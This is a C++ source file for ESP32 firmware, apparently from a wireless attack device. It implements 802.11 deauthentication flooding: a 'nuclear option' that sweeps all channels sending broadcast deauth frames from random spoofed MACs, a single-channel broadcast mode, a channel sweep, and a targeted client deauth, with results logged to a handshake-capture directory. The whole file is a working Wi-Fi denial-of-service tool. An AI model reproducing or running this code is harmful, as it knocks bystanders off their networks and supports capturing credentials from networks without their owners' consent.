#include "wifi_deauth.h"
#include "config.h"
#include "rtc_clock.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <LittleFS.h>

namespace WiFiDeauth {

namespace {
volatile bool g_attacking = false;
volatile uint32_t g_packetCount = 0;

// IEEE 802.11 Deauthentication frame
typedef struct {
    uint8_t frameCtrl[2];
    uint8_t duration[2];
    uint8_t destAddr[6];
    uint8_t srcAddr[6];
    uint8_t bssidAddr[6];
    uint8_t seqCtrl[2];
    uint8_t reasonCode[2];
} DeauthFrame;

void buildDeauthFrame(DeauthFrame *frame, const uint8_t *dest,
                      const uint8_t *src, const uint8_t *bssid) {
    frame->frameCtrl[0] = 0xC0;  // Type: Deauthentication
    frame->frameCtrl[1] = 0x00;

    frame->duration[0] = 0x3A;
    frame->duration[1] = 0x01;

    memcpy(frame->destAddr, dest, 6);
    memcpy(frame->srcAddr, src, 6);
    memcpy(frame->bssidAddr, bssid, 6);

    frame->seqCtrl[0] = (esp_random() % 255);
    frame->seqCtrl[1] = (esp_random() % 255);

    frame->reasonCode[0] = 0x01;  // Unspecified reason
    frame->reasonCode[1] = 0x00;
}

void sendDeauthPacket(const uint8_t *dest, const uint8_t *src, const uint8_t *bssid) {
    DeauthFrame frame;
    buildDeauthFrame(&frame, dest, src, bssid);

    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, (void *)&frame, sizeof(frame), false);
    if (ret == ESP_OK) {
        g_packetCount++;
    }
}
}

DeauthResult nuclearOption(uint32_t durationMs) {
    DeauthResult result = {false, 0, 0, 0, ""};

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    g_attacking = true;
    g_packetCount = 0;

    Serial.println("[WiFi Deauth] NUCLEAR OPTION ACTIVATED - ALL CHANNELS/BSSIDS");

    uint32_t startTime = millis();
    uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
    uint8_t channelIdx = 0;
    uint32_t nextChannelSwitch = startTime + 100;  // Switch every 100ms

    while (g_attacking && (millis() - startTime) < durationMs) {
        if (!TxArm::isArmed()) {
            result.error = "TX disarmed";
            break;
        }

        uint32_t now = millis();

        // Switch channel periodically
        if (now >= nextChannelSwitch) {
            uint8_t ch = channels[channelIdx % 14];
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            channelIdx++;
            nextChannelSwitch = now + 100;
            result.channelsTested++;
        }

        // Send deauth to broadcast address (affects all clients)
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        uint8_t randomMac[6];
        for (int i = 0; i < 6; i++) {
            randomMac[i] = (esp_random() % 255);
        }

        // Deauth from multiple spoofed APs
        sendDeauthPacket(broadcast, randomMac, broadcast);
        sendDeauthPacket(broadcast, randomMac, randomMac);

        delay(1);
    }

    g_attacking = false;
    result.success = (g_packetCount > 0);
    result.packetsSent = g_packetCount;
    result.elapsedMs = millis() - startTime;

    // Log
    String logFile = HANDSHAKE_CAPTURE_DIR;
    logFile += "/wifi_deauth.csv";
    File f = LittleFS.open(logFile, "a");
    if (f) {
        String line = RtcClock::isoTimestamp() + ",DEAUTH_NUCLEAR,";
        line += String(result.packetsSent) + " packets," + String(result.channelsTested) + " channels";
        f.println(line);
        f.close();
    }

    return result;
}

DeauthResult broadcastDeauth(const DeauthConfig &config) {
    DeauthResult result = {false, 0, 0, 0, ""};

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    g_attacking = true;
    g_packetCount = 0;

    Serial.printf("[WiFi Deauth] Broadcast deauth on channel %d\n", config.targetChannel);

    esp_wifi_set_channel(config.targetChannel, WIFI_SECOND_CHAN_NONE);

    uint32_t startTime = millis();
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t seqNum = 0;

    while (g_attacking && (millis() - startTime) < config.durationMs) {
        if (!TxArm::isArmed()) {
            result.error = "TX disarmed";
            break;
        }

        uint8_t spoofedMac[6];
        if (config.randomizeMac) {
            for (int i = 0; i < 6; i++) {
                spoofedMac[i] = (esp_random() % 255);
            }
        } else {
            memcpy(spoofedMac, config.targetBssid, 6);
            if (config.repeatSequence) {
                spoofedMac[5] = seqNum++;
            }
        }

        sendDeauthPacket(broadcast, spoofedMac, config.targetBssid);

        delay(1000 / config.packetsPerSec);
    }

    g_attacking = false;
    result.success = (g_packetCount > 0);
    result.packetsSent = g_packetCount;
    result.elapsedMs = millis() - startTime;

    return result;
}

DeauthResult channelSweep(const DeauthConfig &config) {
    DeauthResult result = {false, 0, 0, 0, ""};

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    g_attacking = true;
    g_packetCount = 0;

    uint32_t startTime = millis();
    uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
    uint8_t channelIdx = 0;
    uint32_t nextSwitch = startTime;
    uint32_t durationPerChannel = config.durationMs / 14;

    while (g_attacking && (millis() - startTime) < config.durationMs) {
        if (!TxArm::isArmed()) {
            result.error = "TX disarmed";
            break;
        }

        uint32_t now = millis();

        if (now >= nextSwitch) {
            uint8_t ch = channels[channelIdx % 14];
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            Serial.printf("[WiFi Deauth] Channel %d\n", ch);
            channelIdx++;
            nextSwitch = now + durationPerChannel;
            result.channelsTested++;
        }

        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        uint8_t randomMac[6];
        for (int i = 0; i < 6; i++) {
            randomMac[i] = (esp_random() % 255);
        }

        sendDeauthPacket(broadcast, randomMac, broadcast);

        delay(1);
    }

    g_attacking = false;
    result.success = (g_packetCount > 0);
    result.packetsSent = g_packetCount;
    result.elapsedMs = millis() - startTime;

    return result;
}

DeauthResult targeted(const DeauthConfig &config) {
    DeauthResult result = {false, 0, 0, 0, ""};

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    g_attacking = true;
    g_packetCount = 0;

    esp_wifi_set_channel(config.targetChannel, WIFI_SECOND_CHAN_NONE);

    uint32_t startTime = millis();

    while (g_attacking && (millis() - startTime) < config.durationMs) {
        if (!TxArm::isArmed()) {
            result.error = "TX disarmed";
            break;
        }

        sendDeauthPacket(config.targetClient, config.targetBssid, config.targetBssid);

        delay(1000 / config.packetsPerSec);
    }

    g_attacking = false;
    result.success = (g_packetCount > 0);
    result.packetsSent = g_packetCount;
    result.elapsedMs = millis() - startTime;

    return result;
}

void stop() {
    g_attacking = false;
    Serial.println("[WiFi Deauth] Attack stopped");
}

bool isActive() {
    return g_attacking;
}

DeauthResult sendDeauthFrames(const String &targetBSSID, uint32_t durationMs, bool broadcastClients) {
    DeauthConfig config;
    memset(&config, 0, sizeof(config));
    config.mode = broadcastClients ? BROADCAST : TARGETED;
    config.durationMs = durationMs;
    config.packetsPerSec = 150;
    config.targetChannel = 6;

    // Parse BSSID string to bytes
    uint8_t bssid[6] = {0};
    if (targetBSSID.length() == 17) {  // AA:BB:CC:DD:EE:FF
        for (int i = 0; i < 6; i++) {
            String hex = targetBSSID.substring(i * 3, i * 3 + 2);
            bssid[i] = (uint8_t)strtol(hex.c_str(), nullptr, 16);
        }
    }
    memcpy(config.targetBssid, bssid, 6);

    if (config.mode == BROADCAST) {
        return broadcastDeauth(config);
    } else {
        return targeted(config);
    }
}

}  // namespace WiFiDeauth
